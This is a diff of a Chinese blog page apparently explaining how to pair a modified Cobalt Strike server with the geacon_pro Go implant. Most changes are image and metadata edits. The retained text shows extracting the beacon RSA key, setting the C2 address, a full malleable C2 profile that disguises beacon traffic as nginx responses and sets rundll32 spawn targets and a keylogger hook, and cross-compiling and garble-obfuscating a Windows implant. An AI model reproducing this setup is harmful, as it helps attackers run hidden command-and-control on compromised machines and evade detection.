@@ -23,12 +23,23 @@
 <meta property="og:site_name" content="这里有一个网站">
 <meta property="og:description" content="前言 过不了360 本文主要记录一下使用二改的cobaltstrike配合geacon_pro的简单配置过程放链接：  https:&#x2F;&#x2F;github.com&#x2F;H4de5-7&#x2F;geacon_pro https:&#x2F;&#x2F;github.com&#x2F;TryGOTry&#x2F;CobaltStrike_Cat_4.5  正文 CobaltStrike_Cat_4.5 配置 首先安装相应版本的jdk 12sudo apt i">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206144500059.png">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206144727301.png">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206150730989.png">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151245027.png">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151330099.png">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151620111.png">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151640780.png">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230208151330801.png">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230208172056488.png">
+<meta property="og:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230210112710514.png">
 <meta property="article:published_time" content="2023-02-06T06:29:33.000Z">
-<meta property="article:modified_time" content="2023-02-17T03:48:04.302Z">
+<meta property="article:modified_time" content="2023-08-02T01:14:12.676Z">
 <meta property="article:author" content="ccadmin">
 <meta property="article:tag" content="geacon_pro">
 <meta property="article:tag" content="cobaltstrike">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206144500059.png">
   
   
   
@@ -222,7 +233,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.9k 字
+          3.7k 字
         
       </span>
     
@@ -233,7 +244,7 @@
         
         
         
-          33 分钟
+          31 分钟
         
       </span>
     
@@ -293,83 +304,33 @@
 <p>用到的工具<a
 target="_blank" rel="noopener" href="https://github.com/jas502n/BeaconTool/releases/tag/1.0">BeaconTool.jar</a>，需要注意运行这个工具需要使用jdk1.8,运行过一次cs的服务端之后，会在同目录生成.cobaltstrike.beacon_keys文件，建议将此文件复制一份到本地，我这里将文件重命名为了1111,运行以下命令就可以获取公钥：</p>
 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>.\<span class="hljs-keyword">BeaconTool.jar </span>-i .\<span class="hljs-number">1111</span> -rsa<br></code></pre></td></tr></table></figure>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230206144500059.png" srcset="/img/loading.gif" lazyload
-alt="image-20230206144500059" />
-<figcaption aria-hidden="true">image-20230206144500059</figcaption>
-</figure>
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206144500059.png" srcset="/img/loading.gif" lazyload class="" title="image-20230206144500059">
 <p>替换到geacon_pro项目的config/config.go,这里注意一下不能有多余的空格，不然会报错，如下：</p>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230206144727301.png" srcset="/img/loading.gif" lazyload
-alt="image-20230206144727301" />
-<figcaption aria-hidden="true">image-20230206144727301</figcaption>
-</figure>
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206144727301.png" srcset="/img/loading.gif" lazyload class="" title="image-20230206144727301">
 <h3 id="修改c2地址">修改c2地址</h3>
 <p>下面的c2的ip和端口先在cs里面新建一个https的listen，然后填入即可</p>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230206150730989.png" srcset="/img/loading.gif" lazyload
-alt="image-20230206150730989" />
-<figcaption aria-hidden="true">image-20230206150730989</figcaption>
-</figure>
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206150730989.png" srcset="/img/loading.gif" lazyload class="" title="image-20230206150730989">
 <h3 id="适配c2profile">适配C2profile</h3>
 <p>提供的配置文件</p>
 <figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-comment"># default sleep time is 60s</span><br><span class="hljs-keyword">set</span> sleeptime <span class="hljs-string">&quot;3000&quot;</span>;<br><span class="hljs-keyword">set</span> jitter <span class="hljs-string">&quot;7&quot;</span>;<br><br>https-certificate &#123;<br>    <span class="hljs-keyword">set</span> C <span class="hljs-string">&quot;KZ&quot;</span>;<br>    <span class="hljs-keyword">set</span> CN <span class="hljs-string">&quot;foren.zik&quot;</span>;<br>    <span class="hljs-keyword">set</span> O <span class="hljs-string">&quot;NN Fern Sub&quot;</span>;<br>    <span class="hljs-keyword">set</span> OU <span class="hljs-string">&quot;NN Fern&quot;</span>;<br>    <span class="hljs-keyword">set</span> ST <span class="hljs-string">&quot;KZ&quot;</span>;<br>    <span class="hljs-keyword">set</span> validity <span class="hljs-string">&quot;365&quot;</span>;<br>&#125;<br><br><span class="hljs-comment"># define indicators for an HTTP GET</span><br><span class="hljs-keyword">http</span>-get &#123;<br><br>	<span class="hljs-keyword">set</span> uri <span class="hljs-string">&quot;/www/handle/doc&quot;</span>;<br><br>	client &#123;<br><span class="hljs-comment">		#header &quot;Host&quot; &quot;aliyun.com&quot;;</span><br><span class="hljs-comment">		# base64 encode session metadata and store it in the Cookie header.</span><br>		metadata &#123;<br>			base64url;<br>			prepend <span class="hljs-string">&quot;SESSIONID=&quot;</span>;<br>			header <span class="hljs-string">&quot;Cookie&quot;</span>;<br>		&#125;<br>	&#125;<br><br>	server &#123;<br><span class="hljs-comment">		# server should send output with no changes</span><br><span class="hljs-comment">		#header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br>		header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;nginx/1.10.3 (Ubuntu)&quot;</span>;<br>    		header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span>;<br>        	header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;keep-alive&quot;</span>;<br>        	header <span class="hljs-string">&quot;Vary&quot;</span> <span class="hljs-string">&quot;Accept&quot;</span>;<br>        	header <span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-string">&quot;public&quot;</span>;<br>        	header <span class="hljs-string">&quot;Expires&quot;</span> <span class="hljs-string">&quot;0&quot;</span>;<br>        	header <span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-string">&quot;must-revalidate, post-check=0, pre-check=0&quot;</span>;<br><br>		output &#123;<br>			mask;<br>			netbios;<br>			prepend <span class="hljs-string">&quot;data=&quot;</span>;<br>			<span class="hljs-keyword">append</span> <span class="hljs-string">&quot;%%&quot;</span>;<br>			print;<br>		&#125;<br>	&#125;<br>&#125;<br><br><span class="hljs-comment"># define indicators for an HTTP </span><br><span class="hljs-keyword">http</span>-post &#123;<br><span class="hljs-comment">	# Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]</span><br>	<span class="hljs-keyword">set</span> uri <span class="hljs-string">&quot;/IMXo&quot;</span>;<br>	client &#123;<br><span class="hljs-comment">		#header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;				</span><br><br><span class="hljs-comment">		# transmit our session identifier as /submit.php?id=[identifier]</span><br>		<br>		id &#123;				<br>			mask;<br>			netbiosu;<br>			prepend <span class="hljs-string">&quot;user=&quot;</span>;<br>			<span class="hljs-keyword">append</span> <span class="hljs-string">&quot;%%&quot;</span>;<br>			header <span class="hljs-string">&quot;User&quot;</span>;<br>		&#125;<br><br><span class="hljs-comment">		# post our output with no real changes</span><br>		output &#123;<br>			mask;<br>			base64url;<br>			prepend <span class="hljs-string">&quot;data=&quot;</span>;<br>			<span class="hljs-keyword">append</span> <span class="hljs-string">&quot;%%&quot;</span>;		<br>			print;<br>		&#125;<br>	&#125;<br><br><span class="hljs-comment">	# The server&#x27;s response to our HTTP POST</span><br>	server &#123;<br>		header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;nginx/1.10.3 (Ubuntu)&quot;</span>;<br>    		header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span>;<br>        	header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;keep-alive&quot;</span>;<br>       	 	header <span class="hljs-string">&quot;Vary&quot;</span> <span class="hljs-string">&quot;Accept&quot;</span>;<br>        	header <span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-string">&quot;public&quot;</span>;<br>        	header <span class="hljs-string">&quot;Expires&quot;</span> <span class="hljs-string">&quot;0&quot;</span>;<br>        	header <span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-string">&quot;must-revalidate, post-check=0, pre-check=0&quot;</span>;<br><br><span class="hljs-comment">		# this will just print an empty string, meh...</span><br>		output &#123;<br>			mask;<br>			netbios;<br>			prepend <span class="hljs-string">&quot;data=&quot;</span>;<br>			<span class="hljs-keyword">append</span> <span class="hljs-string">&quot;%%&quot;</span>;<br>			print;<br>		&#125;<br>	&#125;<br>&#125;<br><br>post-ex &#123;<br>    <span class="hljs-keyword">set</span> spawnto_x86 <span class="hljs-string">&quot;c:\\windows\\syswow64\\rundll32.exe&quot;</span>;<br>    <span class="hljs-keyword">set</span> spawnto_x64 <span class="hljs-string">&quot;c:\\windows\\system32\\rundll32.exe&quot;</span>;<br>    <br>    <span class="hljs-keyword">set</span> thread_hint <span class="hljs-string">&quot;ntdll.dll!RtlUserThreadStart+0x1000&quot;</span>;<br>    <span class="hljs-keyword">set</span> pipename <span class="hljs-string">&quot;DserNamePipe##, PGMessagePipe##, MsFteWds##&quot;</span>;<br>    <span class="hljs-keyword">set</span> keylogger <span class="hljs-string">&quot;SetWindowsHookEx&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
 <p>修改 CatServer.properties指定为刚刚创建的c2.profile</p>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230206151245027.png" srcset="/img/loading.gif" lazyload
-alt="image-20230206151245027" />
-<figcaption aria-hidden="true">image-20230206151245027</figcaption>
-</figure>
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151245027.png" srcset="/img/loading.gif" lazyload class="" title="image-20230206151245027">
 <p>修改客户端的相关选项为false</p>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230206151330099.png" srcset="/img/loading.gif" lazyload
-alt="image-20230206151330099" />
-<figcaption aria-hidden="true">image-20230206151330099</figcaption>
-</figure>
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151330099.png" srcset="/img/loading.gif" lazyload class="" title="image-20230206151330099">
 <h3 id="编译运行">编译运行</h3>
 <p>在Linux下面编译运行</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">CGO_ENABLED</span>=0 <span class="hljs-attribute">GOOS</span>=windows <span class="hljs-attribute">GOARCH</span>=amd64 go build main.go<br></code></pre></td></tr></table></figure>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230206151620111.png" srcset="/img/loading.gif" lazyload
-alt="image-20230206151620111" />
-<figcaption aria-hidden="true">image-20230206151620111</figcaption>
-</figure>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230206151640780.png" srcset="/img/loading.gif" lazyload
-alt="image-20230206151640780" />
-<figcaption aria-hidden="true">image-20230206151640780</figcaption>
-</figure>
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151620111.png" srcset="/img/loading.gif" lazyload class="" title="image-20230206151620111">
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151640780.png" srcset="/img/loading.gif" lazyload class="" title="image-20230206151640780">
 <h3 id="高级配置">高级配置</h3>
 <p>使用<a
 target="_blank" rel="noopener" href="https://github.com/burrowers/garble">https://github.com/burrowers/garble</a>进行混淆，混淆是在Windows下面进行，并且使用的是cmd。</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> install mvdan.<span class="hljs-keyword">cc</span>/garble@latest<br><span class="hljs-keyword">set</span> GO111MODULE=<span class="hljs-keyword">on</span><br><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> mvdan.<span class="hljs-keyword">cc</span>/garble<br>garble.<span class="hljs-keyword">exe</span> build<br></code></pre></td></tr></table></figure>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230208151330801.png" srcset="/img/loading.gif" lazyload
-alt="image-20230208151330801" />
-<figcaption aria-hidden="true">image-20230208151330801</figcaption>
-</figure>
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230208151330801.png" srcset="/img/loading.gif" lazyload class="" title="image-20230208151330801">
 <p>修改aes iv，在config.go修改完记得在CatServer.properties也修改一下</p>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230208172056488.png" srcset="/img/loading.gif" lazyload
-alt="image-20230208172056488" />
-<figcaption aria-hidden="true">image-20230208172056488</figcaption>
-</figure>
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230208172056488.png" srcset="/img/loading.gif" lazyload class="" title="image-20230208172056488">
 <p>修改CatServer.properties版本和端口，尽量高端口</p>
-<figure>
-<img
-src="../../source/images/geacon-pro快速上手/image-20230210112710514.png" srcset="/img/loading.gif" lazyload
-alt="image-20230210112710514" />
-<figcaption aria-hidden="true">image-20230210112710514</figcaption>
-</figure>
+<img src="/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230210112710514.png" srcset="/img/loading.gif" lazyload class="" title="image-20230210112710514">
 
                 
               </div>
